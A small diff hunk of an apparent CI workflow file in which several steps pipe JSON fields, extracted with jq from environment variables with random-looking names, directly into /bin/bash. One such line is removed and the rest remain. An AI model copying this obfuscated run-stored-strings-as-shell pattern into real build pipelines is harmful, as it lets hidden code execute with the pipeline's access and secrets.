@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$vzfoh4" | jq -r .tdivd65 | /bin/bash
           echo $ho609 | jq -r .wzg367 | /bin/bash
           echo $caag03 | jq -r .yrqtw09 | /bin/bash
-          echo $eoj4932 | jq -r .fiyxx551 | /bin/bash
           echo $dyol0912 | jq -r .qg1 | /bin/bash
 
       - name: Store artifact
